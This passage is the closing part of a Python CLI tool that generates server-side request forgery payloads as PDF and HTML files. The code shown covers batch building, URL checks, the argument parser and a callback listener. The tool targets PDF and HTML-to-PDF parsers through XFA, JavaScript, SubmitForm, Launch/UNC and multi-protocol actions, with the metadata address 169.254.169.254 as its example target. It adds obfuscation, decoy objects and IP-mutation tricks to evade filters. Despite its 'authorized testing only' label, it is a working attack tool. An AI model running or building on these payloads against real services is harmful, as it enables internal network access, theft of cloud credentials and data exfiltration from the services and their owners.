    os.makedirs(output_dir, exist_ok=True)
    selected = types if types else list(BUILD_FUNCTIONS.keys())

    report = {
        'generated_at': datetime.now().isoformat(),
        'generator_version': __version__,
        'target_url': url,
        'options': {
            'compress': compress,
            'obfuscate': obfuscate,
            'junk_count': junk_count,
            'hex_url': hex_url,
            'mutate': mutate,
        },
        'files': [],
    }

    for ptype in selected:
        if ptype not in BUILD_FUNCTIONS:
            logger.warning("Unknown type '%s', skipping" % ptype)
            continue
        try:
            builder = PDFBuilder(compress=compress, obfuscate=obfuscate,
                                 junk_count=junk_count, hex_url=hex_url)
            BUILD_FUNCTIONS[ptype](url, builder)
            out_path = os.path.join(output_dir, 'ssrf_%s.pdf' % ptype)
            builder.generate(out_path)
            with open(out_path, 'rb') as f:
                digest = hashlib.sha256(f.read()).hexdigest()
            report['files'].append({
                'type': ptype, 'path': out_path,
                'sha256': digest, 'size': os.path.getsize(out_path),
                'status': 'ok',
            })
            logger.info('Generated %s' % out_path)
        except Exception as e:
            logger.error("Failed to build '%s': %s" % (ptype, e))
            report['files'].append({'type': ptype, 'status': 'error',
                                    'error': str(e)})

    if include_html:
        try:
            html_path = os.path.join(output_dir, 'ssrf_payload.html')
            report['files'].append(
                generate_html_payload(url, html_path, mutate=mutate))
            logger.info('Generated %s' % html_path)
        except Exception as e:
            report['files'].append({'type': 'html', 'status': 'error',
                                    'error': str(e)})

    report_path = os.path.join(output_dir, 'batch_report.json')
    with open(report_path, 'w') as f:
        json.dump(report, f, indent=2)
    ok = sum(1 for x in report['files'] if x['status'] == 'ok')
    logger.info('Batch report saved to: %s (%d/%d succeeded)'
                % (report_path, ok, len(report['files'])))
    return report


# ============================================================
#                     URL Validation
# ============================================================

def validate_url(url: str, ptype: str):
    """Pre-validate the callback/target URL; warn on odd schemes."""
    parsed = urlparse(url)
    if not parsed.scheme:
        logger.warning("URL '%s' has no scheme — parsers may ignore it" % url)
    if ptype not in ('multi',) and parsed.scheme not in (
            'http', 'https', 'file', 'smb', 'ftp', 'gopher', 'ldap'):
        logger.warning("Scheme '%s' is unusual for type '%s'"
                       % (parsed.scheme, ptype))
    if parsed.scheme in ('http', 'https') and not parsed.netloc:
        raise ValueError("Malformed URL: '%s'" % url)


# ============================================================
#                           Main
# ============================================================

def main():
    parser = argparse.ArgumentParser(
        description='PDF & HTML SSRF Test File Generator v%s '
                    '(authorized testing only)' % __version__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Payload Types (Scenario B):
  xfa         XFA connection source (PDFBox, iText, Tika)
  js          JavaScript auto-execution (launchURL/submitForm/Net.HTTP)
  filespec    External image + FileSpec
  submit      SubmitForm action (form exfiltration)
  launch      Launch action (legacy / Windows UNC)
  uri         URI action (widely supported)
  importdata  ImportData action (FDF/XFDF import)
  gotor       GoToR remote PDF navigation
  gotoe       GoToE embedded file navigation
  rendition   Rendition multimedia fetch
  aa          Additional Actions (/O /C /WC /WS /PV)
  embedded    NEW: nested PDF in EmbeddedFiles (DLP/re-parse chains)
  multi       EXPANDED protocol matrix: http/https/file/ftp/gopher/dict/
              smb/UNC/ldap/jar/netdoc (+ data: negative control)
  all         Combined payload (XFA + JS + FileSpec + Submit + URI)

Scenario A (HTML-to-PDF):  use --html (optionally --mutate)
Scenario C (template fields): use --html --template
""")
    parser.add_argument('--type', '-t', choices=list(BUILD_FUNCTIONS.keys()),
                        help='SSRF payload type')
    parser.add_argument('--types',
                        help='Comma-separated payload subset for batch mode')
    parser.add_argument('--url', '-u', required=True,
                        help='Target/callback URL (e.g. http://169.254.169.254/)')
    parser.add_argument('--output', '-o', default='ssrf_test.pdf',
                        help='Output filename (default: ssrf_test.pdf)')
    parser.add_argument('--compress', '-c', action='store_true',
                        help='Enable FlateDecode compression on streams')
    parser.add_argument('--obfuscate', action='store_true',
                        help='Enable ASCIIHexDecode obfuscation on streams')
    parser.add_argument('--junk', type=int, default=0,
                        help='Number of junk/decoy objects (default: 0)')
    parser.add_argument('--hex-url', action='store_true',
                        help='Encode URL as PDF hex string <hex>')
    parser.add_argument('--batch', '-b', action='store_true',
                        help='Generate payload types in batch mode')
    parser.add_argument('--output-dir', default='./ssrf_output',
                        help='Output directory for batch mode')
    parser.add_argument('--listen', '-l', type=int, metavar='PORT',
                        help='Start callback listener on PORT')
    parser.add_argument('--bind', default='0.0.0.0',
                        help='Listener bind address (default: 0.0.0.0)')
    parser.add_argument('--timeout', type=int, default=60,
                        help='Listener timeout seconds (default: 60)')
    parser.add_argument('--seed', type=int, default=None,
                        help='Random seed for reproducible junk/obfuscation')
    parser.add_argument('--dry-run', action='store_true',
                        help='Build and validate without writing output')
    # --- NEW v3 flags ---
    parser.add_argument('--mutate', action='store_true',
                        help='Generate URL mutations (decimal/octal/hex IP, '
                             'IPv6-mapped, localhost aliases, userinfo tricks)')
    parser.add_argument('--html', action='store_true',
                        help='Scenario A: emit an HTML subresource payload '
                             'file instead of a PDF')
    parser.add_argument('--template', action='store_true',
                        help='With --html: emit injectable fragments for '
                             'business template fields (Scenario C)')
    parser.add_argument('--include-html', action='store_true',
                        help='Batch mode: also emit the HTML payload file')

    args = parser.parse_args()

    if args.seed is not None:
        set_seed(args.seed)
        logger.info('Random seed set to %d' % args.seed)

    # ---- Scenario A / C: HTML generation path ----
    if args.html:
        meta = generate_html_payload(
            args.url, args.output,
            mutate=args.mutate, template_mode=args.template)
        logger.info('HTML payload saved to: %s (%d URL variants, sha256=%s)'
                    % (meta['path'], meta['url_variants'],
                       meta['sha256'][:12]))
        if args.mutate:
            for v in mutate_url(args.url):
                logger.info('  variant: %s' % v)
        return

    # ---- PDF path: require --type unless batch ----
    if not args.batch and not args.type:
        parser.error('--type is required unless --batch or --html is used')

    ptype_for_validation = args.type if args.type else 'multi'
    validate_url(args.url, ptype_for_validation)

    listener_thread = None
    if args.listen:
        _, listener_thread = start_listener(args.listen, args.bind,
                                            args.timeout)

    if args.batch:
        types = [t.strip() for t in args.types.split(',')] if args.types else None
        batch_generate(args.url, args.output_dir,
                       compress=args.compress, obfuscate=args.obfuscate,
                       junk_count=args.junk, hex_url=args.hex_url,
                       types=types, mutate=args.mutate,
                       include_html=args.include_html or args.mutate)
    else:
        builder = PDFBuilder(compress=args.compress,
                             obfuscate=args.obfuscate,
                             junk_count=args.junk,
                             hex_url=args.hex_url)
        BUILD_FUNCTIONS[args.type](args.url, builder)
        if args.dry_run:
            errors = builder.validate()
            logger.info('[DRY-RUN] %d objects built, %d validation issue(s)'
                        % (len(builder.objects), len(errors)))
            sys.exit(0 if not errors else 2)
        builder.generate(args.output)
        logger.info('SSRF test PDF (%s) saved to: %s' % (args.type, args.output))

    if listener_thread:
        logger.info('Waiting for callback (timeout: %ds)...' % args.timeout)
        logger.info('Submit the generated file to the target service now.')
        listener_thread.join(timeout=args.timeout + 5)
        if CallbackHandler.hits:
            hits_path = 'callback_hits.json'
            with open(hits_path, 'w') as f:
                json.dump(CallbackHandler.hits, f, indent=2)
            logger.info('Callback details written to %s' % hits_path)


if __name__ == '__main__':
    main()
